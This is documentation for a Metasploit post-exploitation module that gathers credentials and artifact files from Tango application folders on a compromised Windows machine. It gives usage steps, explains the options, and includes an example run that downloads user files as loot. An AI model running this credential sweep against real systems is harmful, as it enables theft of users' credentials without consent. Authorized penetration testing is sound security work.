## Module Description

This post-exploitation module gathers artifacts found on tango related folders from end users systems.

The list of available artifcts are listed within the module and can be added at anytime. Each artifacts are categorised so that users can specify a category to look for.


## Verification Steps

1. Start MSF console
2. Get a Meterpreter session on a Windows system
3. use post/windows/gather/credentials/tango
4. Set SESSION 1
5. enter 'run' to extract credentials from all applications


## Options
### REGEX

Users can set their own regular expressions so that it could be applied for the credential extraction. The default is set to ^password.

### VERBOSE

By default verbose is turned off. When turned on, the module will show information on files which aren't extracted and information that is not directly related to the artifact output.


### STORE_LOOT
This option is turned on by default and saves the stolen artifacts/files on the local machine,
this is required for also extracting credentials from files using regexp, JSON, XML, and SQLite queries.


### EXTRACT_DATA
This option is turned on by default and will perform the data extraction using the predefined regular expression. The 'Store loot' options must be turned on in order for this to take work.

## Example Run
  ```
msf post(windows/gather/credentials/tango) > run 

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_DATA: true

[*] Tango's parent folder found
[*] Tango's parent folder found
[*] Tango's Install.log file found
[*] Downloading C:\Users\IEUser\AppData\Local\tango\install.log
[*] Tango Install.log downloaded
[+] File saved to:  /root/.msf4/loot/20210521114758_default_192.168.56.106_tangoinstall.log_259187.log

[+] File with data saved:  /root/.msf4/loot/20210521114759_default_192.168.56.106_EXTRACTIONinstal_843961.log
[*] Tango's parent folder found
[*] Tango's Userinfo1.xml file found
[*] Downloading C:\Users\IEUser\AppData\Local\tango\userinfo1.xml
[*] Tango Userinfo1.xml downloaded
[+] File saved to:  /root/.msf4/loot/20210521114759_default_192.168.56.106_tangouserinfo1.x_614135.xml

[+] File with data saved:  /root/.msf4/loot/20210521114759_default_192.168.56.106_EXTRACTIONSuseri_076763.xml
[*] PackRat credential sweep Completed
[*] Post module execution completed
  ```
